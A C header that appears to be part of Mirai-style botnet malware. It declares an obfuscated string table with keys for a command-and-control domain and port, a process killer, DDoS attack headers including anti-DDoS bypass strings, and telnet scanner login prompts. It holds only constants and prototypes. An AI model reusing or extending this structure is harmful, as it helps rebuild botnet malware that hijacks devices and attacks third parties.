#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};

#define TABLE_DOMAIN					1
#define TABLE_CNC_PORT					2
#define TABLE_EXEC_SUCCESS				3
#define TABLE_INSTANCE_EXISTS			4
#define TABLE_KILLER_PROC				5
#define TABLE_KILLER_EXE				6
#define TABLE_KILLER_FD					7
#define TABLE_KILLER_TCP				8
#define TABLE_IOCTL_KEEPALIVE1			9
#define TABLE_IOCTL_KEEPALIVE2 			10
#define TABLE_IOCTL_KEEPALIVE3			11
#define TABLE_IOCTL_KEEPALIVE4			12
#define TABLE_ATK_VSE					13
#define TABLE_ATK_RESOLVER				14
#define TABLE_ATK_NSERV					15
#define TABLE_ATK_KEEP_ALIVE            16 
#define TABLE_ATK_ACCEPT                17 
#define TABLE_ATK_ACCEPT_LNG            18 
#define TABLE_ATK_CONTENT_TYPE          19
#define TABLE_ATK_SET_COOKIE            20 
#define TABLE_ATK_REFRESH_HDR           21  
#define TABLE_ATK_LOCATION_HDR          22 
#define TABLE_ATK_SET_COOKIE_HDR        23 
#define TABLE_ATK_CONTENT_LENGTH_HDR    24 
#define TABLE_ATK_TRANSFER_ENCODING_HDR 25
#define TABLE_ATK_CHUNKED               26
#define TABLE_ATK_KEEP_ALIVE_HDR        27 
#define TABLE_ATK_CONNECTION_HDR        28
#define TABLE_ATK_DOSARREST             29 
#define TABLE_ATK_CLOUDFLARE_NGINX      30 
#define TABLE_HTTP_ONE                  31
#define TABLE_HTTP_TWO                  32
#define TABLE_HTTP_THREE                33
#define TABLE_HTTP_FOUR                 34
#define TABLE_HTTP_FIVE                 35
#define TABLE_RANDOM					36
#define TABLE_SCAN_CB_PORT				37
#define TABLE_SCAN_SHELL				38
#define TABLE_SCAN_ENABLE				39
#define TABLE_SCAN_SYSTEM				40
#define TABLE_SCAN_LINUXSHELL			41
#define TABLE_SCAN_BAH					42
#define TABLE_SCAN_START				43
#define TABLE_SCAN_SH					44
#define TABLE_SCAN_QUERY				45
#define TABLE_SCAN_RESP					46
#define TABLE_SCAN_NCORRECT				47
#define TABLE_SCAN_PS					48
#define TABLE_SCAN_KILL_9				49
#define TABLE_SCAN_OGIN					50
#define TABLE_SCAN_ENTER				51
#define TABLE_SCAN_ASSWORD				52

#define TABLE_MAX_KEYS 					53

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
